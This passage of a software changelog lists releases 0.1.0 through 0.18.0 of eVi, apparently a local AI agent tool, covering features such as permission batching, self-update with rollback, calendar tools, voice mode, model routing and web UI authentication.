  CLI `evi guardrails list / test / path`. Borrowed in spirit from Bedrock
  Guardrails / Gemini safety settings, but fully local.

### Bumped to 0.19.0.

## [0.18.0] — 2026-05-28

### Added — Phase 36: quality-of-life bundle

- **`evi doctor`** — one-shot environment diagnostic. Checks `~/.evi/`
  writability, config.toml parse, LLM backend reachability, hardware
  (RAM/GPU), external binaries (git, tesseract, TTS engine), and every
  optional Python extra. Renders a ✓/⚠/✗ checklist with an
  ok/warn/fail tally. `--strict` exits non-zero on any failure.
- **`read_file` output caching** — results are cached in-process keyed by
  `(resolved path, mtime_ns, size)`. Re-reading an unchanged file returns
  the cached `ToolOutput` (and citation) without touching disk; any edit
  invalidates the entry. Bounded at 128 files. `clear_read_cache()` for
  tests / future explicit invalidation.
- **Permission batching** — when one assistant turn proposes multiple tool
  calls that need approval, eVi now prompts **once** instead of N times.
  New optional `Agent(permission_batch_callback=...)`. The CLI batch
  prompt lists every call and accepts `a` (all) / `n` (none) /
  comma-separated indices (e.g. `1,3`) / `s` (allow all this session).
  Pre-approved categories still never prompt; single-call turns fall back
  to the per-call prompt.
- **Session auto-titling** — `Agent.suggest_title()` produces a terse
  (≤6-word) title from the opening exchange. The web UI calls
  `POST /api/session/{id}/title` after the first turn and renames the tab
  from the raw first message to the LLM-written title. New
  `evi sessions title <id>` prints a title for a saved session.
- **Hot-reload of skills & memory** — confirmed `/reload`
  (`Agent.refresh_config()`) now reflects freshly added skills and memory
  files without a restart, since both stores rescan disk on every prompt
  composition. Locked in with tests.

### Bumped to 0.18.0.

## [0.17.0] — 2026-05-28

### Added — Phase 35: remaining OpenAI SDK params

Closes out the cheap pass-through parameters from `docs/sdk-coverage.md`.

- **`parallel_tool_calls`** — new `[llm] parallel_tool_calls` (default
  `true`). When `false`, the model may only request one tool per
  assistant turn. Per-turn override via `Agent.chat(parallel_tool_calls=…)`
  and web `ChatRequest.parallel_tool_calls`. Only forwarded when `false`
  AND tools are present, so backends that don't speak the flag never see
  it.
- **`max_completion_tokens`** — new `[llm] max_completion_tokens`
  (default `0` = unset). When `> 0` it's sent *instead of* `max_tokens` —
  reasoning models (o-series, some local R1 builds) reject `max_tokens`
  and want the completion-token budget that counts hidden reasoning plus
  visible output.
- **`logit_bias`** — new `[llm] logit_bias`, a JSON string
  (`'{"123": -100, "456": 5}'`) since our flat TOML writer can't nest a
  dict. Values clamp to ±100. Per-turn override via
  `Agent.chat(logit_bias={…})` and web `ChatRequest.logit_bias`. Invalid
  JSON is dropped (logged in `--debug`), never fatal. You need the
  model's tokenizer to find ids, so this is mostly for power use.
- **`n`-best-of variants** — new `Agent.complete_variants(prompt, n)`:
  a stateless, non-streaming, no-tools helper that returns a list of
  independent completions (default `temperature=0.9` for variety). New
  **`evi variants "<prompt>" -n 3 [-t 0.9]`** command. Backends that
  ignore OpenAI's `n` return a single variant; the CLI notes when it got
  fewer than requested.

### Bumped to 0.17.0.

## [0.16.0] — 2026-05-28

### Added — Phase 34: speculative decoding (`prediction`)

- **`Agent.chat(prediction="...")`** forwards OpenAI's predicted-outputs
  hint (https://platform.openai.com/docs/guides/predicted-outputs) via
  `extra_body`. Backends that support it (OpenAI, vLLM, llama.cpp with
  speculative decoding) verify the prediction token-by-token instead of
  regenerating, which is 3-5× faster when the prediction is mostly right.
  Backends that don't recognise the field drop it silently — same risk
  shape as `reasoning_effort`.
- Only applied to the FIRST LLM round-trip in a turn. Once any tool runs,
  the prediction is stale and we let the model write freely.
- **`evi edit <file> "<instruction>"`** — new top-level command. Reads
  the file, sends its contents as the prediction, asks the model to apply
  the instruction, and returns the edited file. Flags:
  - `--diff` — show a coloured unified diff instead of the raw file
  - `--write` / `-w` — overwrite the file (with a confirmation prompt)
  - `--yes` / `-y` — skip the confirmation
  - Default behaviour prints the new content to stdout so you can pipe.
- **`/predict` slash command** for the REPL. Three forms:
  - `/predict <text>` — set a literal prediction string
  - `/predict file <path>` — read a file as the prediction
  - `/predict clear` — drop a pending prediction
  - Tab-completes file paths after `/predict file`.
- **`ChatRequest.prediction`** on the web API — same field, same shape.
  Forwarded through to `agent.chat(prediction=...)`.

### Bumped to 0.16.0.

## [0.15.0] — 2026-05-27

### Added — Phase 32: conversation grep

- **`evi search "<query>"`** greps across every saved transcript under
  `~/.evi/transcripts/`. Substring matching by default, regex via
  `--regex` (case-insensitive). Each hit prints session id, role,
  one-line snippet with surrounding context, and line number into the
  source JSONL.
- Filters: `--days N` window (default 90), `--role user|assistant|tool|system`,
  `--session <id>`, `--limit N`.
- Results stream newest-first. Jump back into a session with
  `evi sessions show <id>` (already shipped in Phase 14.B).
- No new deps — pure stdlib over the existing JSONL transcript store.

### Bumped to 0.15.0.

## [0.14.0] — 2026-05-27

### Added — Phase 31: git-aware code review

- **`evi review`** runs a focused code review with `git diff` as input
  and the LLM as the reviewer. Defaults to `git diff HEAD` (working
  tree vs last commit). Other modes:
  - `evi review HEAD~3..HEAD` — explicit range
  - `evi review --staged` — what's queued for commit
  - `evi review --branch main` — the current branch's PR diff
  - `evi review --file path/to/x.py` — one file
  - `evi review --diff-file change.patch` — saved patch
- The reviewer prompt focuses on bugs, security issues, API breakage,
  performance gotchas, and missing tests; nudges away from style nits;
  ends with a one-line verdict (APPROVE / REQUEST_CHANGES / NEEDS_DISCUSSION).
- The review agent runs scoped: only `fs` / `git` / `index` read-only
  tools are enabled by default so it can pull surrounding context
  without touching anything. `--no-tools` disables tools entirely.
- Pairs with multi-model routing: if you have a `coder` route configured
  with `evi route preset common`, code-heavy review prompts auto-route
  there. The system prompt is review-focused so the model knows its
  job.
- Diffs are capped at 64 KB to fit the context window; longer diffs get
  a `(diff truncated)` marker.

### Bumped to 0.14.0.

## [0.13.0] — 2026-05-27

### Added — Phase 30: citations + rerank

- **Citations.** Tools can now return either a plain `str` (no citations,
  works as before) or a `ToolOutput(text, citations)`. New `Citation`
  dataclass carries `{id, source_type, source_id, excerpt, start, end}`.
  The `ToolResult` event grows a `citations: list[Citation]` field, the
  web SSE serializes it, and the web UI renders chips
  (`[1] path/foo.py:10-25`) underneath each tool bubble.
  - `read_file` emits one citation per call covering the full file.
  - `find_in_project` emits one citation per hit, with line numbers.
  - `web_fetch` emits one citation pointing at the URL.
  - `Tool.call_rich(args)` is the new contract — old `Tool.call(args)`
    is now a thin shim returning just the text for back-compat. All 53
    existing tool-call-site tests still pass unchanged.
- **Local rerank** (`evi/tools/rerank.py`, category `index`, default
  off). After `find_in_project` returns top-K by cosine similarity, the
  `rerank(query, candidates, top_k)` tool re-scores with a local
  cross-encoder (`cross-encoder/ms-marco-MiniLM-L-6-v2`, ~80 MB,
  downloaded on first use). Accepts either bare-string candidates or
  `find_in_project`-shaped `{text, path, lines}` dicts; results carry
  scores + citations. New extra: `pip install 'evi[rerank]'` →
  `sentence-transformers>=3.0`.

### Bumped to 0.13.0.

## [0.12.0] — 2026-05-27

### Added — Phase 29: self-update + rollback

- **`evi update`** checks PyPI for a newer eVi, snapshots the current
  `pip freeze` state, runs `pip install --upgrade evi==<version>` via
  `sys.executable -m pip` (so the upgrade lands in the same venv we're
  running from), and verifies the result by spawning a fresh python and
  importing.
- **Refusals.** Editable installs are detected via `pip show` and
  refused. pipx installs are detected via `PIPX_HOME` or path markers
  and the user is steered to `pipx upgrade`. Locked envs (poetry.lock /
  uv.lock / Pipfile.lock anywhere from cwd up to `$HOME`) are refused
  unless `--force` is passed.
- **Snapshots** live under `~/.evi/snapshots/<ts>_<from>_to_<to>/`
  with `requirements.txt` (the full pre-upgrade pip freeze),
  `version.txt`, and `metadata.json`. Retention: last 5 newest; the
  GC fires automatically after a successful upgrade.
- **`evi update rollback [N|<dir>]`** restores a snapshot by running
  `pip install -r requirements.txt`. Defaults to the newest. We
  restore the FULL freeze, not just eVi, because a transitive bump
  can break the import just as easily as a direct one.
- **`evi update history`** lists snapshots newest-first.
  **`evi update prune --keep N`** is the manual GC.
  **`evi update from-wheel <path>`** does an offline install from a
  local `.whl` or sdist, with the same snapshot + verify lifecycle.
  **`evi update settings`** prints install kind + snapshot dir +
  retention.
- **`evi update check`** is the safe probe — hits PyPI only, never
  installs anything.

No new runtime deps (uses stdlib `subprocess` + httpx, both already in core).

### Bumped to 0.12.0.

## [0.11.0] — 2026-05-27

### Added — Phase 28: calendar reading

- **iCal URL + CalDAV calendar support.** New `evi/calendar.py` reads
  public iCal endpoints (Google Calendar Secret iCal address, iCloud
  public, Outlook publish, raw .ics files) AND authenticated CalDAV
  servers (Nextcloud, Fastmail, Posteo, iCloud private, mailbox.org,
  Synology, Radicale). Sources live in `~/.evi/calendars.json`;
  passwords are NEVER stored on disk — CalDAV sources name an env var
  (`password_env="EVI_CAL_WORK_PASSWORD"`) that the reader resolves at
  call time. Both reader paths normalise to the same `Event` dataclass
  so tools don't see the source-shape difference.
  - **Tools** (`evi/tools/calendar.py`, category `calendar`, default off):
    `calendar_today`, `calendar_week`, `calendar_search(query, days)`,
    `calendar_next`. All accept an optional `source` to scope to one
    feed. Per-source errors are surfaced inline so one broken feed
    doesn't black out the rest.
  - **CLI**: `evi calendar list / add / remove / peek`. `add` takes
    `--url`, `--kind ical|caldav`, `--username`, `--password-env`,
    `--calendar` (to scope to a named CalDAV calendar).
  - **Extras**: new `pip install 'evi[calendar]'` →
    `icalendar`, `recurring-ical-events`, `caldav`.
  - **Output**: events grouped by day, `HH:MM-HH:MM Summary @ location`
    per line, all-day events sort to the top of their day.
- **Deferred integrations tracked.** New `docs/future-integrations.md`
  captures the explicitly-deferred apps (Home Assistant, Notion,
  Spotify, Plex, Slack, VS Code, JetBrains) plus a long candidate
  table (Discord, Telegram, GitHub native, Linear, IMAP/SMTP, RSS, etc).
  Easy to extend as ideas come up.

### Bumped to 0.11.0.

## [0.10.0] — 2026-05-27

### Added — Phases 24-27: voice loop, routing, web auth, REPL completion

- **Always-on voice mode** (`evi voice loop`). New `evi.voice.AutoListener`
  runs an energy-based VAD over a continuous `sounddevice.InputStream` at
  16 kHz / 30 ms frames. Speech is detected on ~180 ms of voice; an
  utterance ends after ~750 ms of silence (or 30 s max), gets transcribed
  via Whisper, optionally gated on a wake phrase, and handed to a
  callback. The new `voice loop` CLI orchestrates listener + Agent +
  AutoSpeaker so you can keep talking without typing. `pause()`/`resume()`
  on the listener prevents eVi from transcribing its own TTS echo.
  - Flags: `--wake "<phrase>"`, `--model tiny.en`, `--device cpu`,
    `--no-speak`, `--rms-threshold`, `--debug`.
  - Needs `pip install 'evi[stt]'` for sounddevice + faster-whisper.
- **Multi-model routing.** New `evi/routing.py` picks a model per turn
  based on cheap keyword rules first, then optionally a tiny LLM
  classifier. Routes live in `~/.evi/routes.json`; keyword matches use
  word-boundary anchoring so `hi` doesn't trip on `this`. Precedence:
  routing > fast_mode > configured default. Re-rolls (`continue_chat`)
  stay on the model the original turn picked.
  - New config: `[llm] router_enabled`, `[llm] router_model`.
  - New CLI: `evi route list/add/remove/test/enable/disable/classifier/preset`.
  - A `common` preset ships with `coder` + `fast` routes out of the box.
- **Web UI auth.** New `[web] auth_token` config. When set, every
  `/api/*` endpoint requires `Authorization: Bearer <token>` or a
  `?token=<token>` query param; `/`, `/static/*`, `/images/*`,
  `/api/health`, `/api/auth/check` stay public so the login form can
  bootstrap. The browser stores the token in `localStorage` and a global
  `fetch` wrapper attaches it automatically. 401 responses pop the
  login overlay back up.
  - New CLI: `evi web-config token show / rotate / clear`.
  - Constant-time compare via `secrets.compare_digest`.
- **REPL tab completion.** The chat REPL now runs through `prompt_toolkit`
  with a custom completer + persistent history at `~/.evi/repl_history`.
  Tab completes slash commands, then their arguments — model ids
  (lazy-fetched from the backend), effort levels, on/off toggles, tool
  names for `/forcetool`, filesystem paths for `/image` and `/audio`.
  Falls back to `rich.Console().input` if `prompt_toolkit` is missing.
  - New core dep: `prompt_toolkit>=3.0`.

### Bumped to 0.10.0.

## [0.9.0] — 2026-05-27

### Added — Phase 23: OCR + streaming TTS

- **OCR tool** (`evi/tools/ocr.py`). `ocr_image(path, language='eng')`
  shells out to the Tesseract binary; clean error pointing at the
  install command for each OS if the binary isn't on PATH. Bonus
  `ocr_screen()` takes a fresh screenshot and OCRs it in one call (needs
  `[computer]` + tesseract). New `tools.ocr` toggle, default off.
- **Streaming TTS alongside chat.** New `evi.voice.AutoSpeaker` buffers
  TextDelta strings and emits sentence-by-sentence speech on a worker
  thread (no overlap). Strips code fences, inline code, and URLs before
  speaking.
  - **CLI**: `/speak on|off` slash command. The REPL feeds every
    TextDelta into an `AutoSpeaker` when on, flushes the partial on
    `Done`.
  - **Web**: 🔇/🔊 toggle button in the header (persists in
    `localStorage`). Uses the browser's built-in `speechSynthesis` API
    — no extra deps, works in any modern browser. Speech is cancelled
    on the next user turn so we never talk over you.

### Bumped to 0.9.0.

## [0.8.0] — 2026-05-27

### Added — Phase 21 (polish) + Phase 22 (distribution)

- **Real markdown rendering in chat.** Assistant + system messages now go
  through marked.js with GFM tables, breaks, lists, and code blocks —
  the latter syntax-highlighted via highlight.js (github-dark theme).
  Falls back to escaped text + minimal substitutions if a CDN fails.
- **Long tool-output collapse.** Tool result bubbles longer than 400
  chars get a "show full (N chars)" toggle.
- **`evi tail`** — `tail -f` for today's transcripts. Optional
  session-id filter, configurable poll interval.
- **`pyproject.toml`** finalised for PyPI: `[project.urls]` block,
  expanded classifiers, fixed misplaced `dependencies` key. `python -m
  build` produces a clean sdist + wheel including the static
  frontend files.
- **`Dockerfile` + `docker-compose.yml`** for the headless-server case.
  Two-stage build (no compiler in the runtime image); compose stack
  wires eVi to a sibling Ollama container with named volumes.
- **CI + release workflows.** `.github/workflows/ci.yml` runs pytest +
  ruff across macOS / Linux / Windows × Py 3.11 / 3.12 on every PR.
  `release.yml` is tag-triggered, sanity-checks the version, publishes
  to PyPI via Trusted Publishing, and creates a GitHub Release with
  artifacts.
- **`docs/releasing.md`** — how to cut a version.

### Bumped to 0.8.0.

## [0.7.0] — 2026-05-27

### Added — Phase 20

- **Obsidian sync.** New `evi/obsidian.py` syncs `~/.evi/memory/` with
  a sub-directory of an Obsidian vault. CLI: `evi obsidian
  status / push / pull / sync`. Push writes each memory entry with YAML
  frontmatter (`source: evi-memory`, `name`, `created`, `updated`) so
  Dataview / Bases queries can find them. Pull strips frontmatter
  before storage; safe-name validation rejects invalid filenames. Sync
  is bidirectional with last-modified-time conflict resolution. New
  config block `[obsidian] vault_path = "..."`, `subdir = "eVi"`.
- **Multi-conversation tabs in the web UI.** Tab bar above the chat
  log; each tab is a separate session id. Click to switch (rebuilds
  history from `/api/session/{id}/history`), `+` to start a new one,
  `×` to close (always keeps at least one tab). Auto-labels from the
  first user message. State persists in `localStorage` so reloads
  restore the workspace. Branch-from-bubble now opens a new tab
  inheriting the parent's label with a "· branch" suffix.

### Bumped to 0.7.0.

## [0.6.0] — 2026-05-27

### Added — Phase 19: editable messages, export, Mermaid, live reload, audio in, PWA

- **Editable messages / re-roll / branch.** Hover any chat bubble in the
  web UI to get an action toolbar: ✏️ edit, 🔄 re-roll (assistant only),
  🌿 branch into a new session, 🗑 delete from here on. Editing a user
  message truncates everything after it and auto-rerolls. Backend:
  `Agent.truncate_history / edit_message / rewind_to_last_user /
  continue_chat` + four new endpoints under `/api/session/{id}/{...}`.
- **Conversation export.** `evi sessions export <id> --format md|html|json`
  with optional `--out`. Markdown rendering preserves tool calls + raw
  tool output; HTML wraps in a styled standalone doc.
- **Mermaid rendering in the web UI.** ` ```mermaid ` blocks in any
  assistant response get rendered as inline SVG via the Mermaid 11 ESM
  CDN module.
- **Live config reload.** New `Agent.refresh_config()` re-reads
  `config.toml` and re-composes the system prompt (so memory / skill
  edits land too). CLI `/reload` and web `/reload` slash commands wired up.
- **Audio file input.** Drop a `.wav / .mp3 / .m4a / .ogg / .flac / .webm`
  on the chat → backend transcribes it via faster-whisper → the text
  lands in the input box for you to review and send. New endpoint:
  `POST /api/transcribe`. CLI: `/audio <path>`.
- **PWA + responsive web UI.** `manifest.json` makes it installable on
  iOS / Android / desktop browsers. New mobile media queries collapse
  decorative header chips, bump touch targets, set 16px input to avoid
  iOS zoom, and turn the hover-only action toolbar into a low-opacity
  always-visible band on small screens.

### Bumped to 0.6.0.

## [0.5.0] — 2026-05-27

### Added — Phase 18: OpenAI SDK feature completion

- **`response_format`**. `Agent.chat(response_format=...)` per-turn override.
  Use `{"type": "json_object"}` for plain JSON mode, or `{"type":
  "json_schema", ...}` for guaranteed-shape outputs on backends that
  support it. New CLI command: `/json <prompt>`.
- **`tool_choice`**. Per-turn override with the OpenAI vocabulary:
  `"auto"` (default), `"none"` (drops the tools list entirely),
  `"required"` (force any tool), or `{"type":"function","function":
  {"name":"x"}}` (force a specific one). New CLI: `/notools <prompt>`
  and `/forcetool <name> <prompt>`.
- **Sampling knobs**: `top_p`, `presence_penalty`, `frequency_penalty`
  in `[llm]` config. Only forwarded when non-default so picky local
  backends don't choke.
- **`seed`**: `[llm] seed = N` for reproducible outputs.
- **`stop` sequences**: `[llm] stop_sequences = [...]` for hard
  generation cutoffs.
- **Real token usage**. Every turn requests
  `stream_options.include_usage`; the final chunk's `usage` becomes a
  new `UsageStats(prompt, completion, total)` event yielded between the
  last `TextDelta` and `Done`. CLI prints a dim line; web UI overwrites
  the approximate usage chip with the real number. Backends that don't
  emit usage simply never emit the event.

### Bumped to 0.5.0.

## [0.4.0] — 2026-05-27

### Added — Phase 17: model picker

- **Web UI model picker.** Footer button shows `model · effort · fast` and
  opens a popup matching the inspiration screenshot: Models section
  (number-key shortcuts 1–9), Effort section (Low / Medium / High / Max),
  Fast mode toggle. **Ctrl+I** opens the picker; **Shift+Ctrl+E** cycles
  effort levels without opening it.
- **`GET / POST /api/model-picker`.** GET returns `{active, models,
  effort, effort_levels, fast_mode, fast_model, backend}`. POST accepts
  any subset of those fields, persists to `config.toml`, and pushes the
  change into every live session's agent so the next turn picks it up
  without a restart.
- **Reasoning effort.** New `[llm] reasoning_effort` (default `medium`,
  one of `low|medium|high|max`). Passed via `extra_body` so backends
  that ignore it just drop it. Surfaces as a `[low|high|max]` chip in
  the CLI prompt when non-default.
- **Fast mode.** New `[llm] fast_mode` + `[llm] fast_model`. When on,
  `Agent.chat` swaps to `fast_model` for the current turn — pattern is
  a 14B for daily work, a 3B–7B as the fast alternate. CLI prompt grows
  a `[fast]` chip when active.
- **CLI slash commands.** `/effort [low|medium|high|max]` and
  `/fast [on|off|<model-id>]`. Calling `/fast <model-id>` sets the
  fast_model AND flips fast_mode on in one go.

### Bumped to 0.4.0.

## [0.3.0] — 2026-05-27

### Added — Phase 16: daily-driver UX bundle

- **`<think>…</think>` block surfacing.** The agent loop now parses
  reasoning-model output as it streams and routes inner thoughts to a new
  `ThinkingDelta` event. CLI renders dim+italic; web UI shows a
  collapsible `<details>` "thinking…" bubble that auto-collapses once
  visible output starts.
- **Parallel tool calls.** When the model emits multiple `tool_calls` in
  one assistant turn, the bodies now run in a `ThreadPoolExecutor`
  (max 4 workers). Permission and before-hook gating still runs serially
  so the human answers one prompt at a time; result order is preserved
  for `tool_call_id` consistency.
- **Context-window awareness.** New `[llm] context_size` (default 32768)
  + `[llm] compact_when_pct` (default 85%). `Agent.token_usage()`
  returns `(used, ceiling)`; the CLI prompt shows `12k/32k`,
  red-tinted past 85%. Web UI gets a usage chip refreshed on every
  turn via the new `GET /api/session/{id}/usage` endpoint. Auto-compact
  fires on the percentage threshold in addition to message-count.
- **Semantic file search.** `evi/index.py` builds a numpy-backed
  embedding index of any directory; `evi/tools/index.py` exposes
  `index_project`, `find_in_project`, `project_index_stats`. Embeddings
  go through `[llm] embed_model` (default `nomic-embed-text` for
  Ollama). New `evi[index]` extra (`numpy>=1.26`).
- **Git intelligence tools.** `git_status`, `git_diff`, `git_log`,
  `git_show`, `git_blame`, `git_info` — read-only subprocess wrappers.
  Category `git`, default off.
- **`evi --debug` / `-d`.** Top-level flag (also `EVI_DEBUG=1`). Prints
  every LLM request, tool call, and tool result to stderr. New
  `evi/debug.py` module with `dlog(tag, payload)`.

### Bumped to 0.3.0.

## [0.2.0] — 2026-05-27

### Added — Phase 14: setup wizard, sessions, PDF/SQLite, file upload, compaction, backup

- **`evi setup`** — interactive first-run wizard. Detects which backends
  are reachable, runs the hardware recommender, optionally pulls a model
  via Ollama, writes `config.toml`.
- **`evi sessions`** — list / show / resume past sessions backed by the
  transcript log. Resuming hydrates a fresh `Agent`'s history.
- **`read_pdf` tool** (`pdf` category) — extract text from a PDF via
  PyMuPDF. New `evi[pdf]` optional dep.
- **`sqlite_schema` + `sqlite_query` tools** (`sqlite` category) —
  read-only schema + SELECT against any SQLite file. DDL/DML rejected.
- **Web file upload** — `POST /api/upload` saves to per-session temp dir;
  drag-and-drop in the browser; the path lands in the next user message.
- **Conversation auto-compaction** — when chat history grows past a
  threshold the oldest turns are summarised into one system note via a
  subagent. Manual trigger: `/compact`. Threshold via
  `[llm] compact_after_messages`.
- **`evi backup create / restore`** — portable archive of `~/.evi/`, with
  configurable excludes (`--no-transcripts`, `--no-models`). Re-installs
  config + memory + skills + scheduled tasks on a new machine.

### Added — Phase 15: vision

- Vision-capable backends can now receive images. `Agent.chat()` takes
  optional `images=` list; CLI exposes `/image <path>` and the web UI
  shows a preview when you drop in an image.

### Added — polish

- `LICENSE` (MIT) shipped.
- `docs/tools.md` — full tool reference with safety table.
- `docs/troubleshooting.md` — common failure modes.
- `examples/` — sample `EVI.md`, two skills (`code-review`,
  `summarize-paper`), and a `commit` slash command.
- `--version` / `-V` flag.
- `py.typed` marker for downstream type checkers.

### Fixed

- (Tracked in 0.1.0; restated for visibility.)

## [0.1.0] — 2026-05-27

Initial coherent release across thirteen phases:

### Foundation (phases 1, 3–6)
- Core agent loop, tool framework, fs/code tools, CLI REPL.
- ComfyUI image-generation tool.
- FastAPI + SSE web UI.
- Tauri 2 desktop shell (local-spawn and remote modes).
- Persistent memory with soft-delete + agent system-prompt injection.
- Scoped subagent runner (`delegate_explore`, `delegate_plan`).

### Integrations (phase 7)
- MCP (Model Context Protocol) client + bridge + manager. Any stdio MCP
  server's tools appear as `<server>.<tool>` in the registry.

### Workflows (phases 8, 10, 11)
- Skills (markdown instruction packets) with on-demand loading.
- Scheduled tasks via APScheduler.
- EVI.md auto-loaded project context.
- Slash command dispatcher: `/help`, `/reset`, `/tools`, `/model`,
  `/goal`, `/plan`, `/auto`, plus user-defined templates under
  `~/.evi/commands/`.
- Persistent `/goal` injection + one-shot plan mode.
- Hook system over `~/.evi/hooks.toml` (`before_tool_call` /
  `after_tool_call`, glob match, veto).
- Permission flow with auto-approval categories and `/auto on|off`.
- `evi worktree` for parallel git work.

### Models + multi-machine (phase 9)
- Backend abstraction: LM Studio, Ollama, llama.cpp, OpenAI-compatible.
- `evi models list / use / info / recommend / pull / backend`.
- Hardware recommender (nvidia-smi parse + psutil) with curated tiers.
- HuggingFace direct downloads (`hf:<repo>:<file>`).
- Profiles (`~/.evi/profiles/<name>.toml`) overlay base config.
- Tauri remote mode via `EVI_REMOTE_URL`.

### Transcripts, dreaming, vision-of-the-world (phase 12)
- Session transcripts (JSONL) feeding the dream engine.
- `evi dream` — scheduled memory consolidation with audit logging.
- Web search + fetch tools.
- TTS via platform CLIs (no Python deps).
- Computer use (`screenshot`, `click`, `type_text`, `key`, `scroll`).

### Phase 13 — listen + parity + polish
- STT via faster-whisper.
- Web UI parity: server-side slash dispatcher; permission flow as SSE
  `PermissionRequest` events; browser dialog; `/api/decide` endpoint.
- Top-level `README.md` rewrite; `docs/architecture.md`,
  `docs/configuration.md`, `docs/multi-machine.md`,
  `docs/development.md`; install + test scripts.

[0.2.0]: #020--2026-05-27
[0.1.0]: #010--2026-05-27
